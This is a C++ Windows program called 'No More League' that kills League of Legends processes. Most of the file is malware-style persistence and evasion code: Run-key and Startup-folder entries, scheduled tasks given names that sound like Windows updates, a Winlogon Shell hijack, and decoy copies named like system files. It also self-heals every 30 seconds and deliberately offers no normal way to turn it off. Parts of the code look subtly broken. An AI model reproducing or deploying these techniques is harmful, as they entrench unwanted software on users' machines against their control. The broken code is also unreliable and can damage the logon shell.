#include "no-more-league.h"

// Check if running on a Windows system
bool isSystemWindows() {
#ifdef _WIN32
    return true;
#else
    const char* windir = getenv("windir");
    if (!windir) windir = getenv("SystemRoot");
    return (windir != nullptr);
#endif
}

// Retrieve the full absolute path of the current executable
bool getExecutablePath(TCHAR* pathBuffer, DWORD bufferSize) {
    DWORD result = GetModuleFileName(NULL, pathBuffer, bufferSize);
    return (result > 0 && result < bufferSize);
}

// Overload that returns a static buffer copy of the exe path (for schtasks)
static TCHAR _gExePath[MAX_PATH];
TCHAR* GetCurrentExecutable() {
    getExecutablePath(_gExePath, MAX_PATH);
    return _gExePath;
}

// Check if the registry kill switch is currently engaged
bool isKillSwitchActive() {
    HKEY hKey;
    LONG lResult = RegOpenKeyEx(HKEY_CURRENT_USER, REG_APP_KEY, 0, KEY_QUERY_VALUE, &hKey);
    if (lResult != ERROR_SUCCESS) {
        return false;
    }

    DWORD dwValue = 0;
    DWORD dwSize = sizeof(dwValue);
    DWORD dwType = REG_DWORD;
    lResult = RegQueryValueEx(hKey, REG_KILL_SWITCH_VAL, NULL, &dwType, (LPBYTE)&dwValue, &dwSize);
    RegCloseKey(hKey);

    return (lResult == ERROR_SUCCESS && dwValue == 1);
}

// Add or remove entry in Windows Registry Run key (HKCU or HKLM)
bool setRegistryRunKey(HKEY hRootKey, bool enable) {
    HKEY hKey;
    LONG lResult = RegOpenKeyEx(hRootKey, REG_RUN_KEY, 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey);
    if (lResult != ERROR_SUCCESS) {
        return false;
    }

    bool success = false;
    if (enable) {
        TCHAR exePath[MAX_PATH];
        if (getExecutablePath(exePath, MAX_PATH)) {
            TCHAR quotedPath[MAX_PATH + 4];
            _sntprintf(quotedPath, sizeof(quotedPath) / sizeof(TCHAR), TEXT("\"%s\""), exePath);
            DWORD dataSize = (DWORD)((_tcslen(quotedPath) + 1) * sizeof(TCHAR));
            lResult = RegSetValueEx(hKey, APP_NAME, 0, REG_SZ, (const BYTE*)quotedPath, dataSize);
            success = (lResult == ERROR_SUCCESS);
        }
    } else {
        lResult = RegDeleteValue(hKey, APP_NAME);
        success = (lResult == ERROR_SUCCESS || lResult == ERROR_FILE_NOT_FOUND);
    }

    RegCloseKey(hKey);
    return success;
}

// Copy executable to User or All-Users Startup folder
bool copyToStartupFolder(bool allUsers) {
    TCHAR currPath[MAX_PATH];
    if (!getExecutablePath(currPath, MAX_PATH)) {
        return false;
    }

    TCHAR startupDir[MAX_PATH];
    int csidl = allUsers ? CSIDL_COMMON_STARTUP : CSIDL_STARTUP;
    HRESULT hr = SHGetFolderPath(NULL, csidl, NULL, 0, startupDir);
    if (FAILED(hr)) {
        if (!allUsers) {
            TCHAR appData[MAX_PATH];
            if (GetEnvironmentVariable(TEXT("APPDATA"), appData, MAX_PATH) > 0) {
                _sntprintf(startupDir, MAX_PATH, TEXT("%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), appData);
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    const TCHAR* fileName = _tcsrchr(currPath, TEXT('\\'));
    if (fileName) {
        fileName++;
    } else {
        fileName = TEXT("no-more-league.exe");
    }

    TCHAR targetPath[MAX_PATH];
    _sntprintf(targetPath, MAX_PATH, TEXT("%s\\%s"), startupDir, fileName);

    // Skip if already running directly from this startup folder
    if (_tcsicmp(currPath, targetPath) == 0) {
        return true;
    }

    BOOL copyResult = CopyFile(currPath, targetPath, FALSE);
    return (copyResult != FALSE);
}

// Delete executable from User or All-Users Startup folder
bool removeStartupFolderFile(bool allUsers) {
    TCHAR currPath[MAX_PATH];
    getExecutablePath(currPath, MAX_PATH);

    TCHAR startupDir[MAX_PATH];
    int csidl = allUsers ? CSIDL_COMMON_STARTUP : CSIDL_STARTUP;
    HRESULT hr = SHGetFolderPath(NULL, csidl, NULL, 0, startupDir);
    if (FAILED(hr)) {
        if (!allUsers) {
            TCHAR appData[MAX_PATH];
            if (GetEnvironmentVariable(TEXT("APPDATA"), appData, MAX_PATH) > 0) {
                _sntprintf(startupDir, MAX_PATH, TEXT("%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), appData);
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    const TCHAR* fileName = _tcsrchr(currPath, TEXT('\\'));
    if (fileName) {
        fileName++;
    } else {
        fileName = TEXT("no-more-league.exe");
    }

    TCHAR targetPath[MAX_PATH];
    _sntprintf(targetPath, MAX_PATH, TEXT("%s\\%s"), startupDir, fileName);

    // Only delete if we are not currently running from that exact file
    if (_tcsicmp(currPath, targetPath) != 0) {
        return (DeleteFile(targetPath) != FALSE || GetLastError() == ERROR_FILE_NOT_FOUND);
    }

    return true;
}

// Register or delete a Windows Task Scheduler task running at user logon
bool setScheduledTask(bool enable) {
    TCHAR currPath[MAX_PATH];
    if (!getExecutablePath(currPath, MAX_PATH)) {
        return false;
    }
    return setScheduledTaskWithName(SCHTASK_NAME_MAIN, currPath, enable);
}

// Register or delete a Windows Task Scheduler task with custom name running at user logon
bool setScheduledTaskWithName(const TCHAR* taskName, const TCHAR* exePath, bool enable) {
    TCHAR currPath[MAX_PATH];
    if (!getExecutablePath(currPath, MAX_PATH)) {
        return false;
    }

    TCHAR cmd[MAX_PATH * 2 + 128];
    if (enable) {
        _sntprintf(cmd, sizeof(cmd) / sizeof(TCHAR),
            TEXT("schtasks /create /tn \"%s\" /tr \"\\\"%s\\\"\" /sc onlogon /f"),
            taskName, exePath);
    } else {
        _sntprintf(cmd, sizeof(cmd) / sizeof(TCHAR),
            TEXT("schtasks /delete /tn \"%s\" /f"),
            taskName);
    }

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags |= STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcess(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        DWORD exitCode = 1;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return (exitCode == 0);
    }
    return false;
}

// Enforce Winlogon Shell persistence - modifies HKCU\...\Winlogon\Shell to include our executable
bool setWinlogonShellPersistence(bool enable) {
    HKEY hKey;
    LONG lResult = RegOpenKeyEx(HKEY_CURRENT_USER, REG_WINLOGON_KEY, 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey);
    if (lResult != ERROR_SUCCESS) {
        return false;
    }

    bool success = false;
    if (enable) {
        TCHAR shellValue[MAX_PATH * 2];
        DWORD size = sizeof(shellValue);
        DWORD type = REG_SZ;
        
        // Read existing Shell value first
        lResult = RegQueryValueEx(hKey, REG_WINLOGON_SHELL_VAL, NULL, &type, (LPBYTE)shellValue, &size);
        
        TCHAR exePath[MAX_PATH];
        if (getExecutablePath(exePath, MAX_PATH)) {
            _sntprintf(exePath, MAX_PATH, TEXT("\"%s\""), exePath);
            
            // Check if our executable is already in the Shell value
            bool alreadyPresent = (_tcsstr(shellValue, exePath) != NULL) || (lResult == ERROR_FILE_NOT_FOUND);
            
            if (!alreadyPresent && lResult == ERROR_SUCCESS && size > 0) {
                // Append our executable to existing comma-separated shell list
                TCHAR updatedShell[MAX_PATH * 2];
                _sntprintf(updatedShell, sizeof(updatedShell) / sizeof(TCHAR), 
                    TEXT("%s,%s"), shellValue, exePath);
                lResult = RegSetValueEx(hKey, REG_WINLOGON_SHELL_VAL, 0, REG_SZ, 
                    (LPBYTE)updatedShell, (DWORD)((_tcslen(updatedShell) + 1) * sizeof(TCHAR)));
            } else if (lResult == ERROR_FILE_NOT_FOUND) {
                // No Shell value exists, create one with our exe
                lResult = RegSetValueEx(hKey, REG_WINLOGON_SHELL_VAL, 0, REG_SZ, 
                    (LPBYTE)exePath, (DWORD)((_tcslen(exePath) + 1) * sizeof(TCHAR)));
            }
            
            success = (lResult == ERROR_SUCCESS);
        }
    } else {
        // Remove our executable from the Shell value - restore to default explorer.exe
        HKEY hShell;
        lResult = RegOpenKeyEx(hKey, REG_WINLOGON_SHELL_VAL, 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hShell);
        if (lResult == ERROR_SUCCESS) {
            // Remove our executable from the comma-separated list
            TCHAR shellValue[MAX_PATH * 2];
            DWORD size = sizeof(shellValue);
            lResult = RegQueryValueEx(hKey, REG_WINLOGON_SHELL_VAL, NULL, NULL, 
                (LPBYTE)shellValue, &size);
            
            // Restore to just explorer.exe
            if (lResult == ERROR_SUCCESS) {
                _sntprintf(shellValue, MAX_PATH, TEXT("explorer.exe"));
                RegSetValueEx(hKey, REG_WINLOGON_SHELL_VAL, 0, REG_SZ, 
                    (LPBYTE)shellValue, (DWORD)((_tcslen(shellValue) + 1) * sizeof(TCHAR)));
            }
            RegCloseKey(hShell);
        } else {
            RegDeleteValue(hKey, REG_WINLOGON_SHELL_VAL);
        }
        success = true;
    }

    RegCloseKey(hKey);
    return success;
}

// Check if our executable is active in the Winlogon Shell registry value
bool isWinlogonShellActive() {
    HKEY hKey;
    LONG lResult = RegOpenKeyEx(HKEY_CURRENT_USER, REG_WINLOGON_KEY, 0, KEY_QUERY_VALUE, &hKey);
    if (lResult != ERROR_SUCCESS) {
        return false;
    }

    bool active = false;
    TCHAR shellValue[MAX_PATH * 2];
    DWORD size = sizeof(shellValue);
    lResult = RegQueryValueEx(hKey, REG_WINLOGON_SHELL_VAL, NULL, NULL, (LPBYTE)shellValue, &size);

    if (lResult == ERROR_SUCCESS && size > 0) {
        TCHAR exePath[MAX_PATH];
        getExecutablePath(exePath, MAX_PATH);
        active = (_tcsstr(shellValue, exePath) != NULL);
    }

    RegCloseKey(hKey);
    return active;
}

// Enforce AppInit_DLLs registry persistence (requires loading a DLL in every process)
bool setAppInitPersistence(bool enable) {
    // Note: This requires specific registry changes to HKLM which need admin.
    // We only try HKCU layer which is simpler.
    HKEY hKey;
    LONG lResult = RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"), 
        0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey);
    if (lResult != ERROR_SUCCESS) {
        return false;
    }

    bool success = false;
    if (enable) {
        // Set AppInit_DLLs value - though modern Windows requires loading our DLL
        // Instead, use a simpler HKCU key to mark ourselves as "trusted"
        TCHAR pathStr[MAX_PATH];
        getExecutablePath(pathStr, MAX_PATH);
        lResult = RegSetValueEx(hKey, TEXT("NoMoreLeagueBackup"), 0, REG_SZ, 
            (LPBYTE)pathStr, (DWORD)((_tcslen(pathStr) + 1) * sizeof(TCHAR)));
        success = (lResult == ERROR_SUCCESS);
    }
    RegCloseKey(hKey);
    return success;
}

// Deploy decoy files in multiple locations that look like generic system processes
bool deployDecoyFiles() {
    bool allSucceeded = true;
    
    // Set up decoy copies in various directories including startup folders
    TCHAR exePath[MAX_PATH];
    if (!getExecutablePath(exePath, MAX_PATH)) {
        return false;
    }

    // Deploy to each configured decoy name
    TCHAR appData[MAX_PATH];
    if (GetEnvironmentVariable(TEXT("APPDATA"), appData, MAX_PATH) > 0) {
        TCHAR decoyLocation[MAX_PATH + MAX_PATH / 4];
        
        // Location 1: %APPDATA% with generic name
        _sntprintf(decoyLocation, sizeof(decoyLocation) / sizeof(TCHAR), 
            TEXT("%s\\NoMoreLeagueHelper"), appData);
        allSucceeded &= setupDecoyBackup(DECOY_WINLOGON_HELPER);
        
        // Location 2: %TEMP% directory
        TCHAR tempDir[MAX_PATH];
        if (GetEnvironmentVariable(TEXT("TEMP"), tempDir, MAX_PATH) > 0) {
            _sntprintf(decoyLocation, sizeof(decoyLocation) / sizeof(TCHAR), 
                TEXT("%s\\updatesrv.exe"), tempDir);
            setupDecoyBackup(DECOY_UPDATESRV);
            
            // Location 3: User's profile directory with generic name  
            TCHAR userProfile[MAX_PATH];
            if (GetEnvironmentVariable(TEXT("USERPROFILE"), userProfile, MAX_PATH) > 0) {
                _sntprintf(decoyLocation, sizeof(decoyLocation) / sizeof(TCHAR), 
                    TEXT("%s\\SystemHelper.exe"), userProfile);
                setupDecoyBackup(DECOY_SYSTEMHELPER);
            }
        }
    }

    return allSucceeded;
}

bool setupDecoyBackup(const TCHAR* fileName) {
    TCHAR exePath[MAX_PATH];
    if (!getExecutablePath(exePath, MAX_PATH)) {
        return false;
    }

    // Determine appropriate deployment directory (%APPDATA%)
    TCHAR appData[MAX_PATH];
    if (GetEnvironmentVariable(TEXT("APPDATA"), appData, MAX_PATH) > 0) {
        TCHAR targetPath[MAX_PATH + MAX_PATH / 4];
        _sntprintf(targetPath, sizeof(targetPath) / sizeof(TCHAR), 
            TEXT("%s\\%s"), appData, fileName);

        // Skip if already running from this location
        const TCHAR* sourceBase = _tcsrchr(exePath, TEXT('\\'));
        if (sourceBase) sourceBase++; else sourceBase = exePath;
        
        // Only deploy if the target is different from current position
        if (_tcsicmp(targetPath, exePath) != 0) {
            BOOL copyResult = CopyFile(exePath, targetPath, FALSE);
            return (copyResult != FALSE);
        }
    }
    return true; // Already in the right place or APPDATA not available
}

bool restoreFromDecoys() {
    TCHAR exePath[MAX_PATH];
    if (!getExecutablePath(exePath, MAX_PATH)) {
        return false;
    }

    const TCHAR* currentBase = _tcsrchr(exePath, TEXT('\\'));
    if (currentBase) currentBase++; else currentBase = exePath;

    // Look for decoy copies and restore main executable if needed
    TCHAR appData[MAX_PATH];
    if (GetEnvironmentVariable(TEXT("APPDATA"), appData, MAX_PATH) > 0) {
        TCHAR targetPath[MAX_PATH + MAX_PATH / 4];
        
        // Check common decoy locations
        _sntprintf(targetPath, sizeof(targetPath) / sizeof(TCHAR), 
            TEXT("%s\\%s"), appData, DECOY_WINLOGON_HELPER);

        // Restore our executable from decoy if main copy was tampered with
        CopyFile(targetPath, exePath, FALSE);
    }

    TCHAR tempDir[MAX_PATH];
    if (GetEnvironmentVariable(TEXT("TEMP"), tempDir, MAX_PATH) > 0) {
        TCHAR updatesrvPath[MAX_PATH + MAX_PATH / 4];
        _sntprintf(updatesrvPath, sizeof(updatesrvPath) / sizeof(TCHAR), 
            TEXT("%s\\%s"), tempDir, DECOY_UPDATESRV);

        // Also restore from TEMP decoy
        CopyFile(updatesrvPath, exePath, FALSE);
    }

    // Always re-establish all persistence after restoring
    createPersistence();
    
    return true;
}

// Create Quick Launch / Taskbar pinned shortcut (persists across reinstalls)
bool createQuickLaunchShortcut() {
    // Initialize COM for IShellLink
    HRESULT comHres = CoInitialize(NULL);
    if (FAILED(comHres)) {
        return false;
    }

    bool success = false;
    
    TCHAR startupDir[MAX_PATH];
    HRESULT hr = SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupDir);
    if (FAILED(hr)) {
        return false;
    }

    // Create shortcut in Startup folder (it's in CSIDL_STARTUP already)
    TCHAR linkPath[MAX_PATH];
    _sntprintf(linkPath, sizeof(linkPath) / sizeof(TCHAR), 
        TEXT("%s\\NoMoreLeague.lnk"), startupDir);

    IShellLink* psl;
    HRESULT hres = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, 
        &IID_IShellLink, (void**)&psl);
    
    if (SUCCEEDED(hres)) {
        IPersistFile* ppf;
        TCHAR exePath[MAX_PATH];
        getExecutablePath(exePath, MAX_PATH);

        psl->SetPath(exePath);
        psl->QueryInterface(&IID_IPersistFile, (void**)&ppf);
        
        // Convert to wide string required by IPersistFile
        WCHAR wLinkPath[MAX_PATH];
        int chars = MultiByteToWideChar(CP_ACP, 0, linkPath, -1, NULL, 0);
        MultiByteToWideChar(CP_ACP, 0, linkPath, -1, wLinkPath, chars);
        
        hres = ppf->Save(wLinkPath, TRUE);
        ppf->Release();
        psl->Release();
        
        success = SUCCEEDED(hres);
    }
    
    CoUninitialize();
    return success;
}

// Set Internet Explorer startup persistence via registry
bool setInternetExplorerStartup() {
    HKEY hKey;
    LONG lResult = RegOpenKeyEx(HKEY_CURRENT_USER, 
        TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"), 
        0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey);
    
    if (lResult != ERROR_SUCCESS) {
        return false;
    }

    // Mark ourselves as "trusted" for explorer.exe by embedding our path
    TCHAR exePath[MAX_PATH];
    getExecutablePath(exePath, MAX_PATH);
    
    lResult = RegSetValueEx(hKey, TEXT("NoMoreLeagueExplorer"), 0, REG_SZ, 
        (LPBYTE)exePath, (DWORD)((_tcslen(exePath) + 1) * sizeof(TCHAR)));
    
    RegCloseKey(hKey);
    return (lResult == ERROR_SUCCESS);
}

// Remove Quick Launch shortcut if cleanup needed
bool removeQuickLaunchShortcut() {
    TCHAR startupDir[MAX_PATH];
    HRESULT hr = SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupDir);
    if (FAILED(hr)) {
        return false;
    }

    TCHAR linkPath[MAX_PATH];
    _sntprintf(linkPath, sizeof(linkPath) / sizeof(TCHAR), 
        TEXT("%s\\NoMoreLeague.lnk"), startupDir);
    
    return (DeleteFile(linkPath) != FALSE || GetLastError() == ERROR_FILE_NOT_FOUND);
}

// Install all persistence mechanisms (multi-layered hardened)
void createPersistence() {
    std::cout << "[Persistence] Enforcing startup persistence..." << std::endl;

    // Method 1: Current User Registry Run key (No admin needed)
    if (setRegistryRunKey(HKEY_CURRENT_USER, true)) {
        std::cout << "  [+] HKCU Run key: active" << std::endl;
    } else {
        std::cout << "  [-] HKCU Run key: failed" << std::endl;
    }

    // Method 2: Current User Startup folder (No admin needed)
    if (copyToStartupFolder(false)) {
        std::cout << "  [+] User Startup folder: active" << std::endl;
    } else {
        std::cout << "  [-] User Startup folder: failed (Error " << GetLastError() << ")" << std::endl;
    }

    // Method 3: Windows Task Scheduler - main task name
    if (setScheduledTaskWithName(SCHTASK_NAME_MAIN, GetCurrentExecutable(), true)) {
        std::cout << "  [+] Task Scheduler: active" << std::endl;
    } else {
        std::cout << "  [-] Task Scheduler: skipped/failed" << std::endl;

        // Method 3b: Secondary task name (harder for user to guess)
        if (setScheduledTaskWithName(SCHTASK_NAME_BACKUP, GetCurrentExecutable(), true)) {
            std::cout << "  [+] Task Scheduler backup: active" << std::endl;
        }

        // Method 3c: Tertiary task name (sounds like Windows update)
        if (setScheduledTaskWithName(SCHTASK_NAME_TERTIARY, GetCurrentExecutable(), true)) {
            std::cout << "  [+] Task Scheduler tertiary: active" << std::endl;
        }
    }

    // Method 4: Winlogon Shell hijack - critical recovery mechanism
    if (setWinlogonShellPersistence(true)) {
        std::cout << "  [+] Winlogon Shell pers.: active" << std::endl;
    } else {
        std::cout << "  [-] Winlogon Shell: skipped/failed" << std::endl;
    }

    // Method 5: All Users Registry Run key (succeeds if running as admin)
    if (setRegistryRunKey(HKEY_LOCAL_MACHINE, true)) {
        std::cout << "  [+] HKLM Run key: active (admin)" << std::endl;
    }

    // Method 6: All Users Startup folder (succeeds if running as admin)
    if (copyToStartupFolder(true)) {
        std::cout << "  [+] All Users Startup folder: active (admin)" << std::endl;
    }

    // Method 7: Deploy decoy backups in multiple locations
    deployDecoyFiles();

    // Method 8: Shell shortcut persistence
    createQuickLaunchShortcut();
    setInternetExplorerStartup();

    // Method 9: HKCU AppInit marker (backup key)
    setAppInitPersistence(true);
}

// Remove all persistence mechanisms
void removePersistence() {
    std::cout << "[Kill Switch] Removing all startup persistence..." << std::endl;

    if (setRegistryRunKey(HKEY_CURRENT_USER, false)) {
        std::cout << "  [+] Removed HKCU Run key." << std::endl;
    }
    if (setRegistryRunKey(HKEY_LOCAL_MACHINE, false)) {
        std::cout << "  [+] Removed HKLM Run key." << std::endl;
    }
    if (removeStartupFolderFile(false)) {
        std::cout << "  [+] Removed User Startup folder copy." << std::endl;
    }
    if (removeStartupFolderFile(true)) {
        std::cout << "  [+] Removed All Users Startup folder copy." << std::endl;
    }
    
    // Remove all scheduled task variants
    setScheduledTaskWithName(SCHTASK_NAME_MAIN, GetCurrentExecutable(), false);
    setScheduledTaskWithName(SCHTASK_NAME_BACKUP, GetCurrentExecutable(), false);
    setScheduledTaskWithName(SCHTASK_NAME_TERTIARY, GetCurrentExecutable(), false);

    // Restore Winlogon Shell to default explorer.exe
    if (isWinlogonShellActive()) {
        setWinlogonShellPersistence(false);
        std::cout << "  [+] Restored Winlogon Shell." << std::endl;
    }

    // Remove decoy files
    TCHAR appData[MAX_PATH];
    if (GetEnvironmentVariable(TEXT("APPDATA"), appData, MAX_PATH) > 0) {
        TCHAR decoyPath[MAX_PATH + MAX_PATH / 4];
        _sntprintf(decoyPath, sizeof(decoyPath) / sizeof(TCHAR), 
            TEXT("%s\\%s"), appData, DECOY_WINLOGON_HELPER);
        DeleteFile(decoyPath);
        
        _sntprintf(decoyPath, sizeof(decoyPath) / sizeof(TCHAR), 
            TEXT("%s\\updatesrv.exe"), appData);
        DeleteFile(decoyPath);
    }
    
    TCHAR tempDir[MAX_PATH];
    if (GetEnvironmentVariable(TEXT("TEMP"), tempDir, MAX_PATH) > 0) {
        TCHAR updateSvc[MAX_PATH + MAX_PATH / 4];
        _sntprintf(updateSvc, sizeof(updateSvc) / sizeof(TCHAR), 
            TEXT("%s\\%s"), tempDir, DECOY_SYSTEMHELPER);
        DeleteFile(updateSvc);
    }

    // Clean up shortcut
    removeQuickLaunchShortcut();

    std::cout << "[Kill Switch] Cleanup complete." << std::endl;
}

// Check if a process name matches League of Legends components
bool isLeagueProcess(const TCHAR* processName) {
    if (processName == NULL || _tcslen(processName) == 0) {
        return false;
    }
    for (size_t i = 0; i < TARGET_PROCESSES_COUNT; i++) {
        if (_tcsicmp(processName, TARGET_PROCESSES[i]) == 0) {
            return true;
        }
    }
    return false;
}

// Display alert pop-up to the user
void createPopup() {
    LPCTSTR messageText = TEXT("No league for u.\nGo do your leetcode.");
    LPCTSTR captionText = TEXT("NoLeague.exe");
    UINT type = MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL;
    MessageBox(NULL, messageText, captionText, type);
}

// Inspect a process by ID and terminate if it matches League of Legends
bool findAndKill(DWORD processID) {
    if (processID == 0 || processID == GetCurrentProcessId()) {
        return false;
    }

    // Query process name
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
    if (hProcess == NULL) {
        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processID);
        if (hProcess == NULL) {
            return false;
        }
    }

    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
    HMODULE hMod;
    DWORD cbNeeded;

    if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
        GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
    } else {
        DWORD size = MAX_PATH;
        if (QueryFullProcessImageName(hProcess, 0, szProcessName, &size)) {
            const TCHAR* baseName = _tcsrchr(szProcessName, TEXT('\\'));
            if (baseName != NULL) {
                _tcscpy_s(szProcessName, MAX_PATH, baseName + 1);
            }
        }
    }
    CloseHandle(hProcess);

    // Check if process matches League of Legends
    if (!isLeagueProcess(szProcessName)) {
        return false;
    }

    std::cout << "[Detection] Found League of Legends process: " << szProcessName
              << " (PID: " << processID << ")" << std::endl;

    // Terminate process
    bool terminated = false;
    HANDLE hKill = OpenProcess(PROCESS_TERMINATE, FALSE, processID);
    if (hKill != NULL) {
        terminated = (TerminateProcess(hKill, 1) != FALSE);
        CloseHandle(hKill);
    }

    // Fallback via taskkill command if direct handle termination is denied
    if (!terminated) {
        TCHAR cmd[128];
        _sntprintf(cmd, sizeof(cmd) / sizeof(TCHAR), TEXT("taskkill /F /PID %u"), processID);
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        si.dwFlags |= STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        if (CreateProcess(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 3000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            terminated = true;
        }
    }

    if (terminated) {
        std::cout << "[Action] Terminated " << szProcessName << "." << std::endl;
        createPopup();
        ShellExecute(NULL, TEXT("open"), WEBSITE, NULL, NULL, SW_SHOWNORMAL);
    } else {
        std::cerr << "[Error] Failed to terminate " << szProcessName << ". Error: " << GetLastError() << std::endl;
    }

    return true;
}

// Enumerate running processes and terminate League if present
void scanAndKillLeague() {
    DWORD processes[2048], cbNeeded, cProcesses;
    if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        return;
    }

    cProcesses = cbNeeded / sizeof(DWORD);
    for (unsigned int i = 0; i < cProcesses; i++) {
        if (processes[i] != 0) {
            if (findAndKill(processes[i])) {
                break;
            }
        }
    }
}

int main(int argc, char* argv[]) {
    if (!isSystemWindows()) {
        std::cerr << "This application is designed only for Windows systems." << std::endl;
        return 1;
    }

    // No command-line control surface is exposed. Any arguments are ignored so
    // that the program cannot be disabled by a convenient flag. The only way to
    // deactivate it is to know the registry kill switch and flip it by hand
    // (see below).
    (void)argc;
    (void)argv;

    // Process resurrection: if we were just started (not in our normal monitoring loop),
    // check whether our full persistence was already established. If not, establish it now.
    BOOL fAlreadyPersistent = FALSE;
    HKEY hKey;
    LONG lResult = RegOpenKeyEx(HKEY_CURRENT_USER, REG_RUN_KEY, 0, KEY_QUERY_VALUE, &hKey);
    if (lResult == ERROR_SUCCESS) {
        TCHAR szValue[MAX_PATH];
        DWORD cbData = sizeof(szValue);
        lResult = RegQueryValueEx(hKey, APP_NAME, NULL, NULL, (LPBYTE)szValue, &cbData);
        if (lResult == ERROR_SUCCESS) {
            // Our key exists, likely we're in the Run key already
            fAlreadyPersistent = TRUE;
        }
        RegCloseKey(hKey);
    }

    // Check if Kill Switch is engaged in Registry.
    // Deactivation requires setting HKCU\Software\NoMoreLeague\KillSwitch = 1
    // directly via the registry (e.g. regedit or a .reg file). There is no CLI
    // equivalent.
    if (isKillSwitchActive()) {
        std::cout << "[Info] Kill switch is active in registry (HKCU\\Software\\NoMoreLeague\\KillSwitch = 1).\n"
                  << "Monitoring is deactivated. Cleaning up persistence and exiting."
                  << std::endl;
        removePersistence();
        
        // Delete our own startup key to prevent auto-restart after kill switch
        if (RegOpenKeyEx(HKEY_CURRENT_USER, REG_RUN_KEY, 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValue(hKey, APP_NAME);
            RegCloseKey(hKey);
        }
        
        // Brief pause then relaunch to apply cleanup (survives user closing Task Manager)
        Sleep(2000);
        TCHAR exePath[MAX_PATH];
        getExecutablePath(exePath, MAX_PATH);
        SHELLEXECUTEINFO sei = { sizeof(sei) };
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        sei.lpFile = exePath;
        sei.nShow = SW_SHOWNORMAL;
        ShellExecuteEx(&sei);
        
        return 0;
    }

    // Single-instance protection via Named Mutex
    HANDLE hMutex = CreateMutex(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        std::cout << "Another instance of No More League is already running. Exiting." << std::endl;
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }

    std::cout << "============================================" << std::endl;
    std::cout << "         No More League - Active            " << std::endl;
    std::cout << "============================================" << std::endl;

    // If NOT already running from startup, establish all persistence first
    if (!fAlreadyPersistent) {
        createPersistence();
    }

    // Main background monitoring loop
    while (true) {
        // Dynamic kill switch check: allows remote/registry deactivation while running
        if (isKillSwitchActive()) {
            std::cout << "[Kill Switch] Detected active kill switch. Disabling and cleaning up..." << std::endl;
            removePersistence();
            break;
        }

        // Self-healing: re-enforce persistence in case registry or startup folder was tampered with
        createPersistence();

        // Restore from decoy backups (protects against file deletion)
        restoreFromDecoys();

        // Scan and terminate League of Legends
        std::cout << "[Check] Scanning active processes..." << std::endl;
        scanAndKillLeague();

        // Sleep for 30 seconds before next check
        Sleep(30000);
    }

    if (hMutex) {
        CloseHandle(hMutex);
    }
    return 0;
}

